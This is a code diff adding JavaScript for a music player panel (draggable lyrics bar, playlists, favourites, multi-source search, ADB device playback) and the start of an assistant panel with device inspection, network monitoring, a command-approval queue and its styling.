+            var newBottom = window.innerHeight - (_dragState.origBottom + dy)
+            // 限制在屏幕内
+            var rect = lyricsBar.getBoundingClientRect()
+            var halfW = rect.width / 2
+            newX = Math.max(halfW, Math.min(window.innerWidth - halfW, newX))
+            newBottom = Math.max(10, Math.min(window.innerHeight - rect.height - 10, newBottom))
+            setLyricsPosition(newX, window.innerHeight - newBottom - rect.height)
+            e.preventDefault()
+        }
+
+        var onLyricDragEnd = function() {
+            if (!_dragState.dragging) return
+            _dragState.dragging = false
+            lyricsBar.classList.remove('_dragging')
+            if (_dragState.moved && _lyricPosX !== null && _lyricPosY !== null) {
+                try {
+                    localStorage.setItem('smart_music_lyrics_pos', JSON.stringify({ x: _lyricPosX, y: _lyricPosY }))
+                } catch(e) {}
+            }
+        }
+
+        // 绑定拖动事件
+        lyricsBar.addEventListener('mousedown', onLyricDragStart)
+        document.addEventListener('mousemove', onLyricDragMove)
+        document.addEventListener('mouseup', onLyricDragEnd)
+        lyricsBar.addEventListener('touchstart', onLyricDragStart, { passive: false })
+        document.addEventListener('touchmove', onLyricDragMove, { passive: false })
+        document.addEventListener('touchend', onLyricDragEnd)
+        // 双击重置位置
+        lyricsBar.addEventListener('dblclick', function() {
+            resetLyricsPosition()
+            showToast('歌词位置已重置', 'pink', 1500)
+        })
+
+        // ---- 面板显示/隐藏 ----
+        window.toggleMusicPlayer = function() {
+            if (_panelVisible) hidePanel(); else showPanel()
+        }
+
+        var showPanel = function() {
+            _panelVisible = true
+            panel.classList.add('_show')
+            overlay.classList.add('_show')
+            renderPlaylist()
+            renderFavorites()
+            // 恢复歌词开关状态
+            var savedLyrics = '1'
+            try { savedLyrics = localStorage.getItem('smart_music_lyrics_bar') || '1' } catch(e) {}
+            setLyricsOverlay(savedLyrics === '1')
+        }
+
+        var hidePanel = function() {
+            _panelVisible = false
+            panel.classList.remove('_show')
+            overlay.classList.remove('_show')
+        }
+
+        // ---- 事件绑定 ----
+        document.getElementById('sm_close_btn').onclick = hidePanel
+        overlay.onclick = hidePanel
+
+        document.getElementById('sm_play_btn').onclick = togglePlay
+        document.getElementById('sm_prev_btn').onclick = playPrev
+        document.getElementById('sm_next_btn').onclick = playNext
+
+        // 播放模式切换（单曲循环 / 顺序播放）
+        var updatePlayModeBtn = function() {
+            var btn = document.getElementById('sm_mode_btn')
+            if (!btn) return
+            if (_playMode === 'single') {
+                btn.textContent = '🔂'
+                btn.title = '单曲循环（点击切换为顺序播放）'
+                btn.style.background = 'linear-gradient(135deg,#ec4899,#be185d)'
+            } else {
+                btn.textContent = '🔁'
+                btn.title = '顺序播放（点击切换为单曲循环）'
+                btn.style.background = 'linear-gradient(135deg,#f59e0b,#d97706)'
+            }
+        }
+        document.getElementById('sm_mode_btn').onclick = function() {
+            _playMode = _playMode === 'single' ? 'sequence' : 'single'
+            try { localStorage.setItem('smart_music_playmode', _playMode) } catch(e) {}
+            updatePlayModeBtn()
+            showToast(_playMode === 'single' ? '已切换为单曲循环' : '已切换为顺序播放', _playMode === 'single' ? 'green' : 'pink', 2000)
+        }
+        updatePlayModeBtn()
+
+        // 后台播放开关
+        _updateBgSwitch()
+        var _bgSw = document.getElementById('sm_bg_switch')
+        if (_bgSw) _bgSw.onclick = _toggleBgPlay
+
+        // 自动续播开关
+        var _updateAutoPlaySwitch = function() {
+            var sw = document.getElementById('sm_autoplay_switch')
+            if (sw) {
+                if (_autoPlayEnabled) sw.classList.add('_on')
+                else sw.classList.remove('_on')
+            }
+        }
+        _updateAutoPlaySwitch()
+        var _autoPlaySw = document.getElementById('sm_autoplay_switch')
+        if (_autoPlaySw) {
+            _autoPlaySw.onclick = function() {
+                _autoPlayEnabled = !_autoPlayEnabled
+                try { localStorage.setItem('smart_music_autoplay', _autoPlayEnabled ? '1' : '0') } catch(e) {}
+                _updateAutoPlaySwitch()
+                showToast('自动续播: ' + (_autoPlayEnabled ? '开启' : '关闭'), 'green', 1500)
+            }
+        }
+
+        // ADB 设备播放按钮
+        var _adbPlayBtn = document.getElementById('sm_adb_play_btn')
+        if (_adbPlayBtn) _adbPlayBtn.onclick = function() { playOnDevice() }
+        var _adbStopBtn = document.getElementById('sm_adb_stop_btn')
+        if (_adbStopBtn) _adbStopBtn.onclick = function() { stopDevicePlay() }
+        // 初始化 ADB 状态显示
+        ;(async function() {
+            if (_runShell) {
+                var available = await _checkAdbAvailable()
+                _updateAdbStatus(available ? '设备可用，点击推送播放' : '未检测到可用设备', false)
+            } else {
+                _updateAdbStatus('需要 Root/Shell 权限', false)
+            }
+        })()
+
+        // 小窗模式按钮
+        var _miniBtn = document.getElementById('sm_minimize_btn')
+        if (_miniBtn) _miniBtn.onclick = toggleMiniMode
+
+        // 小窗拖动事件
+        panel.addEventListener('mousedown', _onMiniDragStart)
+        panel.addEventListener('touchstart', _onMiniDragStart, { passive: false })
+        document.addEventListener('mousemove', _onMiniDragMove)
+        document.addEventListener('touchmove', _onMiniDragMove, { passive: false })
+        document.addEventListener('mouseup', _onMiniDragEnd)
+        document.addEventListener('touchend', _onMiniDragEnd)
+
+        // 高级后台同步开关
+        _updateBgSyncSwitch()
+        var _bgSyncSw = document.getElementById('sm_bgsync_switch')
+        if (_bgSyncSw) _bgSyncSw.onclick = _toggleBgSync
+
+        // 后台音乐控制按钮
+        var _bgPrevBtn = document.getElementById('sm_bg_prev_btn')
+        if (_bgPrevBtn) _bgPrevBtn.onclick = function() { bgMusicPrev() }
+        var _bgPlayBtn = document.getElementById('sm_bg_play_btn')
+        if (_bgPlayBtn) _bgPlayBtn.onclick = function() { bgMusicPlayPause() }
+        var _bgNextBtn = document.getElementById('sm_bg_next_btn')
+        if (_bgNextBtn) _bgNextBtn.onclick = function() { bgMusicNext() }
+
+        // 从 localStorage 恢复后台同步状态
+        try {
+            if (localStorage.getItem('smart_music_bgsync') === '1' && _runShell) {
+                _startBgSync()
+                _updateBgSyncSwitch()
+            }
+        } catch(e) {}
+
+        // 添加歌曲
+        document.getElementById('sm_add_btn').onclick = function() {
+            var urlInput = document.getElementById('sm_url_input')
+            var titleInput = document.getElementById('sm_title_input')
+            var url = (urlInput.value || '').trim()
+            var title = (titleInput.value || '').trim()
+            if (!url) { showToast('请输入音频 URL', 'red'); return }
+            if (!title) {
+                title = url.split('/').pop().replace(/\.[^.]+$/, '') || ('歌曲' + (_playlist.length + 1))
+            }
+            _playlist.push({ url: url, title: title, lrc: '' })
+            savePlaylist()
+            renderPlaylist()
+            urlInput.value = ''
+            titleInput.value = ''
+            showToast('已添加: ' + title, 'green', 2000)
+            // 如果是第一首，自动选中
+            if (_currentIndex < 0) loadSong(_playlist.length - 1)
+        }
+
+        // 回车添加
+        document.getElementById('sm_url_input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') document.getElementById('sm_add_btn').click()
+        })
+
+        // 扫描本地
+        document.getElementById('sm_scan_btn').onclick = scanLocalMusic
+
+        // Listen1 多源搜索
+        document.getElementById('sm_search_btn').onclick = searchAll
+        document.getElementById('sm_search_input').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') searchAll()
+        })
+        // 平台切换
+        var pfBtns = document.querySelectorAll('#sm_platform_filter .sm-pf-btn')
+        pfBtns.forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                var pf = btn.getAttribute('data-pf')
+                _activePlatforms[pf] = !_activePlatforms[pf]
+                if (_activePlatforms[pf]) btn.classList.add('_on')
+                else btn.classList.remove('_on')
+            })
+        })
+        // 搜索结果点击播放
+        document.getElementById('sm_search_results').addEventListener('click', function(e) {
+            var favBtn = e.target.closest('.sm-fav-btn')
+            if (favBtn) {
+                e.stopPropagation()
+                var favIdx = parseInt(favBtn.getAttribute('data-fav-toggle'))
+                if (!isNaN(favIdx) && _searchResults[favIdx]) {
+                    toggleFavorite(_searchResults[favIdx])
+                }
+                return
+            }
+            var item = e.target.closest('.sm-search-item')
+            if (!item || item.classList.contains('_loading')) return
+            var idx = parseInt(item.getAttribute('data-search-idx'))
+            if (!isNaN(idx) && _searchResults[idx]) {
+                playSearchSong(_searchResults[idx])
+            }
+        })
+
+        // 播放列表点击
+        document.getElementById('sm_playlist_container').addEventListener('click', function(e) {
+            var plFavBtn = e.target.closest('[data-pl-fav]')
+            if (plFavBtn) {
+                e.stopPropagation()
+                var plFavIdx = parseInt(plFavBtn.getAttribute('data-pl-fav'))
+                if (!isNaN(plFavIdx) && _playlist[plFavIdx] && _playlist[plFavIdx].songRef) {
+                    toggleFavorite(_playlist[plFavIdx].songRef)
+                }
+                return
+            }
+            var delBtn = e.target.closest('._del')
+            if (delBtn) {
+                e.stopPropagation()
+                var delIdx = parseInt(delBtn.getAttribute('data-del'))
+                _playlist.splice(delIdx, 1)
+                savePlaylist()
+                if (delIdx === _currentIndex) {
+                    _audio.pause()
+                    _isPlaying = false
+                    _currentIndex = -1
+                    updatePlayBtn()
+                    if (_playlist.length > 0) loadSong(0)
+                }
+                renderPlaylist()
+                showToast('已删除', 'pink', 1500)
+                return
+            }
+            var item = e.target.closest('.sm-playlist-item')
+            if (item) {
+                var idx = parseInt(item.getAttribute('data-idx'))
+                loadSong(idx)
+                play()
+            }
+        })
+
+        // 进度条点击
+        document.getElementById('sm_seek_bar').addEventListener('click', function(e) {
+            var rect = this.getBoundingClientRect()
+            var pct = (e.clientX - rect.left) / rect.width
+            if (_audio.duration) {
+                _audio.currentTime = _audio.duration * pct
+                updateProgress()
+            }
+        })
+
+        // 音量条点击
+        document.getElementById('sm_vol_bar').addEventListener('click', function(e) {
+            var rect = this.getBoundingClientRect()
+            var pct = Math.max(0, Math.min(1, (e.clientX - rect.left) / rect.width))
+            _audio.volume = pct
+            var fill = document.getElementById('sm_vol_fill')
+            if (fill) fill.style.width = (pct * 100) + '%'
+            var pctEl = document.getElementById('sm_vol_pct')
+            if (pctEl) pctEl.textContent = Math.round(pct * 100) + '%'
+        })
+
+        // Tab 切换
+        document.getElementById('sm_tab_playlist').onclick = function() {
+            this.classList.add('_active')
+            document.getElementById('sm_tab_favorites').classList.remove('_active')
+            document.getElementById('sm_tab_lyrics').classList.remove('_active')
+            document.getElementById('sm_playlist_tab').style.display = ''
+            document.getElementById('sm_favorites_tab').style.display = 'none'
+            document.getElementById('sm_lyrics_tab').style.display = 'none'
+        }
+        document.getElementById('sm_tab_favorites').onclick = function() {
+            this.classList.add('_active')
+            document.getElementById('sm_tab_playlist').classList.remove('_active')
+            document.getElementById('sm_tab_lyrics').classList.remove('_active')
+            document.getElementById('sm_playlist_tab').style.display = 'none'
+            document.getElementById('sm_favorites_tab').style.display = ''
+            document.getElementById('sm_lyrics_tab').style.display = 'none'
+            renderFavorites()
+        }
+        document.getElementById('sm_tab_lyrics').onclick = function() {
+            this.classList.add('_active')
+            document.getElementById('sm_tab_playlist').classList.remove('_active')
+            document.getElementById('sm_tab_favorites').classList.remove('_active')
+            document.getElementById('sm_playlist_tab').style.display = 'none'
+            document.getElementById('sm_favorites_tab').style.display = 'none'
+            document.getElementById('sm_lyrics_tab').style.display = ''
+        }
+
+        // 收藏列表点击
+        document.getElementById('sm_favorites_container').addEventListener('click', function(e) {
+            var favDel = e.target.closest('[data-fav-del]')
+            if (favDel) {
+                e.stopPropagation()
+                var delIdx = parseInt(favDel.getAttribute('data-fav-del'))
+                if (!isNaN(delIdx) && _favorites[delIdx]) {
+                    var removedName = _favorites[delIdx].name || '未知'
+                    _favorites.splice(delIdx, 1)
+                    saveFavorites()
+                    renderFavorites()
+                    renderSearchResults()
+                    renderPlaylist()
+                    showToast('已移除收藏: ' + removedName, 'pink', 1500)
+                }
+                return
+            }
+            var favItem = e.target.closest('.sm-fav-item')
+            if (favItem) {
+                var idx = parseInt(favItem.getAttribute('data-fav-idx'))
+                if (!isNaN(idx) && _favorites[idx]) {
+                    playFavorite(_favorites[idx])
+                }
+            }
+        })
+
+        // 应用歌词
+        document.getElementById('sm_apply_lrc_btn').onclick = function() {
+            var ta = document.getElementById('sm_lrc_textarea')
+            var lrcText = (ta.value || '').trim()
+            _lrcData = parseLRC(lrcText)
+            _lrcLineIndex = -1
+            if (_lrcData.length) {
+                showToast('歌词已应用（' + _lrcData.length + ' 行）', 'green', 2500)
+            } else {
+                // 纯文本歌词：按行存储，时间间隔均匀
+                var lines = lrcText.split('\n').filter(function(l) { return l.trim() })
+                if (lines.length) {
+                    _lrcData = lines.map(function(line, i) {
+                        return { time: i * 5, text: line.trim() }
+                    })
+                    showToast('纯文本歌词已应用（' + lines.length + ' 行，每5秒切换）', 'green', 3000)
+                } else {
+                    showToast('歌词为空', 'red')
+                }
+            }
+            updateLyricsBar()
+        }
+
+        // 保存歌词到当前歌曲
+        document.getElementById('sm_save_lrc_btn').onclick = function() {
+            if (_currentIndex < 0) { showToast('请先选择歌曲', 'red'); return }
+            var ta = document.getElementById('sm_lrc_textarea')
+            _playlist[_currentIndex].lrc = (ta.value || '').trim()
+            savePlaylist()
+            showToast('歌词已保存到「' + _playlist[_currentIndex].title + '」', 'green', 2500)
+        }
+
+        // 获取远程歌词
+        document.getElementById('sm_fetch_lrc_btn').onclick = fetchRemoteLRC
+
+        // 歌词悬浮条开关
+        document.getElementById('sm_lyrics_toggle').onclick = function() {
+            setLyricsOverlay(!_lyricsOverlayVisible)
+        }
+
+        // audio 事件
+        _audio.addEventListener('ended', function() {
+            _isPlaying = false
+            updatePlayBtn()
+            stopProgressTimer()
+            if (_playMode === 'single' && _currentIndex >= 0) {
+                // 单曲循环：重新播放当前歌曲
+                _audio.currentTime = 0
+                _audio.play().then(function() {
+                    _isPlaying = true
+                    updatePlayBtn()
+                    startProgressTimer()
+                }).catch(function() {})
+            } else {
+                // 顺序播放：播放下一首
+                playNext()
+            }
+        })
+
+        _audio.addEventListener('loadedmetadata', function() {
+            updateProgress()
+        })
+
+        _audio.addEventListener('error', function() {
+            _isPlaying = false
+            updatePlayBtn()
+            stopProgressTimer()
+
+            // 自动重试：如果当前歌曲有 songRef，尝试重新获取播放地址
+            if (_currentIndex >= 0 && _playlist[_currentIndex] && _playlist[_currentIndex].songRef && _retryCount < 2) {
+                _retryCount++
+                showToast('播放地址已过期，正在重新获取...（第' + _retryCount + '次）', 'pink', 3000)
+                ;(async function() {
+                    var songObj = _playlist[_currentIndex].songRef
+                    var newUrl = await getPlayUrl(songObj)
+                    if (newUrl) {
+                        _playlist[_currentIndex].url = newUrl
+                        savePlaylist()
+                        renderPlaylist()
+                        _audio.src = newUrl
+                        _audio.load()
+                        _audio.play().then(function() {
+                            _isPlaying = true
+                            updatePlayBtn()
+                            startProgressTimer()
+                        }).catch(function(e) {
+                            showToast('重新获取后仍无法播放: ' + (e.message || ''), 'red', 4000)
+                        })
+                    } else {
+                        showToast('音频加载失败，该歌曲可能需要VIP或暂无可用音源', 'red', 4000)
+                    }
+                })()
+            } else {
+                showToast('音频加载失败，请检查 URL 是否可访问', 'red', 4000)
+            }
+        })
+
+        // 初始渲染
+        renderPlaylist()
+
+        // 初始化音量条
+        var volFill = document.getElementById('sm_vol_fill')
+        if (volFill) volFill.style.width = '80%'
+
+        // 自动续播（延迟一下确保 DOM 就绪）
+        if (_autoPlayEnabled) {
+            setTimeout(function() { _tryAutoResume() }, 800)
+        }
+
+        addDiagLog('音乐播放器模块已加载（播放列表 ' + _playlist.length + ' 首）', 'success')
+    })()
+    }, 300);
+
+    // ============ AI 智能助手模块（设备巡检 + 网络监控 + 待执行命令审批） ============
+    // 【性能优化】延迟600ms加载，优先渲染主界面
+    setTimeout(function() {
+    ;(function() {
+        // ---- 状态 ----
+        var _aiRunning = false
+        var _aiCheckTimer = null        // 设备巡检定时器
+        var _netCheckTimer = null       // 网络监控定时器
+        var _panelVisible = false
+        var _pendingCommands = []       // {id, command, description, reason, category, status: 'pending'|'approved'|'rejected'|'done'|'failed', result}
+        var _aiLogs = []               // {time, text, level}
+        var _netHistory = []           // {time, ping, loss, dns, status}
+        var _lastNetNotify = 0         // 上次网络通知时间
+        var _netNotifyCooldown = 120000 // 2分钟冷却
+        var _cmdIdCounter = 1
+        var _scanCount = 0
+        var _issuesFound = 0
+        var _netStatus = { ping: -1, loss: -1, dns: -1, status: '未知', suggestion: '' }
+
+        // 从 localStorage 恢复设置
+        try { _aiRunning = localStorage.getItem('smart_ai_running') === '1' } catch(e) {}
+        var _autoApproveSafe = false
+        try { _autoApproveSafe = localStorage.getItem('smart_ai_auto_safe') === '1' } catch(e) {}
+
+        var showToast = function(msg, color, dur) {
+            try { if (typeof createToast === 'function') createToast(msg, color || 'pink', dur || 3000) } catch(e) {}
+        }
+
+        // getShell 兼容层（基于全局 runShellWithRoot）
+        // 修复：getShell is not defined
+        var getShell = function() {
+            if (typeof runShellWithRoot !== 'function') return null
+            // 返回一个兼容对象，调用方式: _rs(cmd, timeout)
+            return function(cmd, timeoutMs) {
+                return new Promise(function(resolve) {
+                    try {
+                        runShellWithRoot(cmd, timeoutMs || 5000).then(function(r) {
+                            // 统一返回格式: {content, success}
+                            if (typeof r === 'string') {
+                                resolve({ content: r, success: true })
+                            } else if (r && typeof r === 'object') {
+                                resolve({ content: r.content || r.stdout || '', success: !!r.success })
+                            } else {
+                                resolve({ content: '', success: false })
+                            }
+                        }).catch(function() {
+                            resolve({ content: '', success: false })
+                        })
+                    } catch(e) {
+                        resolve({ content: '', success: false })
+                    }
+                })
+            }
+        }
+
+        var aiLog = function(msg, level) {
+            var now = new Date()
+            var t = String(now.getHours()).padStart(2,'0') + ':' + String(now.getMinutes()).padStart(2,'0') + ':' + String(now.getSeconds()).padStart(2,'0')
+            var icon = level === 'warn' ? '⚠️' : level === 'error' ? '🔴' : level === 'success' ? '✅' : level === 'net' ? '📡' : 'ℹ️'
+            _aiLogs.unshift({ time: t, text: msg, level: level || 'info', icon: icon })
+            if (_aiLogs.length > 100) _aiLogs.length = 100
+            renderAILogs()
+        }
+
+        var getShell = function() {
+            return typeof runShellWithRoot !== 'undefined' ? runShellWithRoot : null
+        }
+
+        // ---- CSS ----
+        var style = document.createElement('style')
+        style.textContent = `
+        #smart_ai_panel {
+            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            width: 420px; max-width: 94vw; max-height: 88vh; overflow-y: auto;
+            z-index: 100002; border-radius: 18px; padding: 0;
+            background: linear-gradient(135deg, rgba(20,18,35,.97), rgba(35,28,55,.97));
+            border: 1px solid rgba(167,139,250,.3);
+            box-shadow: 0 8px 50px rgba(0,0,0,.7), 0 0 0 1px rgba(167,139,250,.1);
+            display: none; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+        #smart_ai_panel._show { display: block; animation: smart_ai_fadein .25s ease; }
+        @keyframes smart_ai_fadein { from { opacity:0; transform:translate(-50%,-48%) } to { opacity:1; transform:translate(-50%,-50%) } }
+        #smart_ai_overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,.45); z-index: 100001; display: none; }
+        #smart_ai_overlay._show { display: block; }
+        #smart_ai_fab {
+            position: fixed; bottom: 70px; right: 16px; z-index: 100003;
+            width: 52px; height: 52px; border-radius: 50%; border: none; cursor: pointer;
+            background: linear-gradient(135deg, #6366f1, #8b5cf6); color: #fff; font-size: 22px;
+            box-shadow: 0 4px 20px rgba(99,102,241,.5), 0 0 0 2px rgba(167,139,250,.2);
+            display: none; align-items: center; justify-content: center; transition: transform .2s;
+        }
+        #smart_ai_fab._show { display: flex; }
+        #smart_ai_fab._running { background: linear-gradient(135deg, #22c55e, #16a34a); box-shadow: 0 4px 20px rgba(34,197,94,.5); }
+        #smart_ai_fab._running::before { content: ''; position: absolute; inset: -4px; border-radius: 50%; border: 2px solid rgba(34,197,94,.4); animation: smart_ai_pulse 1.5s ease-in-out infinite; }
+        #smart_ai_fab._haspending { background: linear-gradient(135deg, #f59e0b, #ef4444); box-shadow: 0 4px 20px rgba(245,158,11,.5); }
+        @keyframes smart_ai_pulse { 0%,100% { transform: scale(1); opacity: .6 } 50% { transform: scale(1.3); opacity: 0 } }
+        #smart_ai_fab .fab-badge { position: absolute; top: -4px; right: -4px; min-width: 18px; height: 18px; border-radius: 9px; background: #ef4444; color: #fff; font-size: 10px; font-weight: bold; display: flex; align-items: center; justify-content: center; padding: 0 4px; }
+        .ai-section { padding: 12px 16px; }
+        .ai-header { display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; border-bottom: 1px solid rgba(167,139,250,.15); background: linear-gradient(135deg, rgba(99,102,241,.1), rgba(139,92,246,.08)); border-radius: 18px 18px 0 0; }
+        .ai-title { font-size: 15px; font-weight: bold; background: linear-gradient(90deg, #818cf8, #c4b5fd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .ai-close { background: rgba(255,255,255,.1); border: none; color: #fff; width: 28px; height: 28px; border-radius: 50%; cursor: pointer; font-size: 16px; display: flex; align-items: center; justify-content: center; transition: all .2s; }
+        .ai-close:hover { background: rgba(255,100,100,.3); }
+        .ai-btn { border: none; border-radius: 10px; padding: 8px 16px; font-size: 13px; font-weight: bold; color: #fff; cursor: pointer; transition: all .2s; }
+        .ai-btn:active { transform: scale(.95); }
+        .ai-btn-start { background: linear-gradient(135deg, #22c55e, #16a34a); }
+        .ai-btn-stop { background: linear-gradient(135deg, #ef4444, #dc2626); }
+        .ai-btn-scan { background: linear-gradient(135deg, #6366f1, #8b5cf6); }
+        .ai-btn-approve { background: linear-gradient(135deg, #22c55e, #16a34a); }
+        .ai-btn-reject { background: linear-gradient(135deg, #6b7280, #4b5563); }
+        .ai-btn-execall { background: linear-gradient(135deg, #f59e0b, #d97706); }
+        .ai-status-card { padding: 12px; border-radius: 12px; background: rgba(255,255,255,.04); border: 1px solid rgba(167,139,250,.1); margin-bottom: 8px; }
+        .ai-status-row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 4px; }
+        .ai-status-row:last-child { margin-bottom: 0; }
+        .ai-status-val { font-weight: bold; }
+        .ai-status-val._good { color: #4ade80; }
+        .ai-status-val._warn { color: #fbbf24; }
+        .ai-status-val._bad { color: #f87171; }
+        .ai-status-val._info { color: #60a5fa; }
+        .ai-cmd-item { padding: 10px 12px; border-radius: 12px; margin-bottom: 8px; background: rgba(255,255,255,.04); border: 1px solid rgba(167,139,250,.15); transition: all .2s; }
+        .ai-cmd-item._pending { border-color: rgba(245,158,11,.4); background: rgba(245,158,11,.06); }
+        .ai-cmd-item._approved { border-color: rgba(34,197,94,.3); }
+        .ai-cmd-item._rejected { opacity: .4; }
+        .ai-cmd-item._done { border-color: rgba(34,197,94,.2); }
+        .ai-cmd-item._failed { border-color: rgba(239,68,68,.3); background: rgba(239,68,68,.06); }
+        .ai-cmd-reason { font-size: 11px; color: rgba(255,255,255,.6); margin-bottom: 4px; line-height: 1.4; }
+        .ai-cmd-text { font-size: 11px; font-family: monospace; background: rgba(0,0,0,.3); padding: 6px 8px; border-radius: 6px; color: #c4b5fd; word-break: break-all; margin-bottom: 6px; max-height: 80px; overflow-y: auto; }
+        .ai-cmd-actions { display: flex; gap: 6px; }
+        .ai-cmd-actions .ai-btn { padding: 5px 12px; font-size: 11px; }
+        .ai-cmd-cat { display: inline-block; font-size: 10px; padding: 1px 8px; border-radius: 8px; margin-right: 6px; }
+        .ai-cmd-cat._storage { background: rgba(96,165,250,.2); color: #60a5fa; }
+        .ai-cmd-cat._memory { background: rgba(167,139,250,.2); color: #a78bfa; }
+        .ai-cmd-cat._network { background: rgba(52,211,153,.2); color: #34d399; }
+        .ai-cmd-cat._system { background: rgba(251,191,36,.2); color: #fbbf24; }
+        .ai-cmd-cat._battery { background: rgba(255,158,205,.2); color: #ff9ecd; }
+        .ai-cmd-result { font-size: 10px; color: rgba(34,197,94,.7); margin-top: 4px; font-family: monospace; }
+        .ai-cmd-result._err { color: rgba(239,68,68,.7); }
+        .ai-log-area { width: 100%; box-sizing: border-box; height: 140px; overflow-y: auto; padding: 8px; border-radius: 10px; background: rgba(0,0,0,.25); border: 1px solid rgba(167,139,250,.1); font-size: 11px; line-height: 1.6; }
+        .ai-log-line { padding: 1px 0; }
+        .ai-log-time { color: rgba(255,255,255,.3); margin-right: 4px; }
+        .ai-empty { text-align: center; padding: 16px; color: rgba(255,255,255,.25); font-size: 12px; }
+        .ai-net-bar { height: 4px; border-radius: 2px; background: rgba(255,255,255,.1); margin-top: 4px; overflow: hidden; }
+        .ai-net-bar-fill { height: 100%; border-radius: 2px; transition: width .5s ease; }
+        .ai-switch-row { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
+        .ai-switch { position: relative; width: 40px; height: 22px; border-radius: 11px; background: rgba(255,255,255,.15); cursor: pointer; transition: background .25s; flex-shrink: 0; }
+        .ai-switch._on { background: linear-gradient(135deg, #22c55e, #16a34a); }
+        .ai-switch::after { content: ''; position: absolute; top: 2px; left: 2px; width: 18px; height: 18px; border-radius: 50%; background: #fff; transition: transform .25s; }
+        .ai-switch._on::after { transform: translateX(18px); }
+        .ai-switch-label { font-size: 12px; color: rgba(255,255,255,.6); }
+        .ai-hint { font-size: 10px; color: rgba(255,255,255,.25); margin-top: 6px; line-height: 1.5; }
+        .ai-section-title { font-size: 12px; font-weight: bold; color: rgba(196,181,253,.8); margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; }
+        .ai-badge { font-size: 10px; padding: 1px 8px; border-radius: 8px; background: rgba(245,158,11,.2); color: #fbbf24; }
+        .ai-badge._0 { display: none; }
+
+        /* ===== PicoClaw 聊天窗口样式 ===== */
+        .ai-tabs { display: flex; gap: 2px; padding: 0 16px; background: linear-gradient(135deg, rgba(99,102,241,.1), rgba(139,92,246,.08)); border-bottom: 1px solid rgba(167,139,250,.15); }
+        .ai-tab {
+            padding: 10px 16px; font-size: 13px; color: rgba(255,255,255,.5);
+            cursor: pointer; border-bottom: 2px solid transparent; transition: all .2s;
+            font-weight: 500;
+        }
+        .ai-tab._active { color: #c4b5fd; border-bottom-color: #8b5cf6; }
+        .ai-tab:hover { color: rgba(255,255,255,.8); }
+        .ai-tab-content { display: none; }
+        .ai-tab-content._active { display: block; }
+
+        /* 聊天区域 */
+        .chat-container { display: flex; flex-direction: column; height: 420px; }
+        .chat-messages {
+            flex: 1; overflow-y: auto; padding: 12px 16px;
+            display: flex; flex-direction: column; gap: 10px;
+        }
+        .chat-msg { max-width: 85%; display: flex; gap: 8px; align-items: flex-start; }
+        .chat-msg._user { align-self: flex-end; flex-direction: row-reverse; }
+        .chat-avatar {
+            width: 28px; height: 28px; border-radius: 50%; flex-shrink: 0;
+            display: flex; align-items: center; justify-content: center; font-size: 14px;
+        }
+        .chat-msg._user .chat-avatar { background: linear-gradient(135deg, #6366f1, #8b5cf6); }
+        .chat-msg._ai .chat-avatar { background: linear-gradient(135deg, #22c55e, #16a34a); }
+        .chat-bubble {
+            padding: 8px 12px; border-radius: 12px; font-size: 12px;
+            line-height: 1.5; word-break: break-word; white-space: pre-wrap;
+        }
+        .chat-msg._user .chat-bubble {
+            background: linear-gradient(135deg, #6366f1, #8b5cf6);
+            color: #fff; border-bottom-right-radius: 4px;
+        }
+        .chat-msg._ai .chat-bubble {
+            background: rgba(255,255,255,.08); color: #e2e8f0;
+            border-bottom-left-radius: 4px; border: 1px solid rgba(255,255,255,.06);
+        }
+        .chat-bubble code { background: rgba(0,0,0,.3); padding: 1px 5px; border-radius: 4px; font-size: 11px; font-family: monospace; }
+        .chat-bubble pre { background: rgba(0,0,0,.3); padding: 8px; border-radius: 6px; overflow-x: auto; margin: 6px 0; }
+        .chat-bubble pre code { background: transparent; padding: 0; }
+
+        .chat-input-area {
+            display: flex; gap: 8px; padding: 10px 16px;
+            border-top: 1px solid rgba(167,139,250,.1);
+            background: rgba(0,0,0,.15);
+        }
+        .chat-input {
+            flex: 1; background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1);
+            border-radius: 10px; padding: 8px 12px; color: #fff; font-size: 12px;
+            outline: none; resize: none; font-family: inherit;
+        }
+        .chat-input:focus { border-color: rgba(139,92,246,.5); background: rgba(255,255,255,.08); }
+        .chat-send-btn {
+            background: linear-gradient(135deg, #22c55e, #16a34a); border: none;
+            color: #fff; padding: 0 16px; border-radius: 10px; font-size: 12px;
+            font-weight: bold; cursor: pointer; transition: all .2s;
+        }
+        .chat-send-btn:active { transform: scale(.95); }
+        .chat-send-btn:disabled { opacity: .5; cursor: not-allowed; }
+
+        .chat-status-bar {
+            padding: 6px 16px; font-size: 10px; color: rgba(255,255,255,.4);
+            display: flex; justify-content: space-between; align-items: center;
+            border-bottom: 1px solid rgba(167,139,250,.08);
+        }
+        .chat-status-dot {
+            display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+            margin-right: 4px;
+        }
+        .chat-status-dot._ok { background: #22c55e; box-shadow: 0 0 6px #22c55e; }
+        .chat-status-dot._bad { background: #ef4444; }
+        .chat-status-dot._warn { background: #f59e0b; box-shadow: 0 0 6px #f59e0b; }
+        .chat-typing { font-size: 11px; color: rgba(255,255,255,.4); font-style: italic; }
+
+        .chat-empty { text-align: center; padding: 40px 20px; color: rgba(255,255,255,.3); }
+        .chat-empty-icon { font-size: 36px; margin-bottom: 10px; }
+        .chat-empty-title { font-size: 14px; font-weight: bold; margin-bottom: 6px; color: rgba(255,255,255,.5); }
+        .chat-empty-desc { font-size: 11px; line-height: 1.6; }
+
+        .chat-quick-actions { display: flex; gap: 6px; flex-wrap: wrap; padding: 8px 16px 0; }
+        .chat-quick-btn {
+            font-size: 10px; padding: 4px 10px; border-radius: 12px;
+            background: rgba(99,102,241,.15); border: 1px solid rgba(99,102,241,.3);
+            color: #a5b4fc; cursor: pointer; transition: all .2s;
+        }
+        .chat-quick-btn:hover { background: rgba(99,102,241,.3); }
+
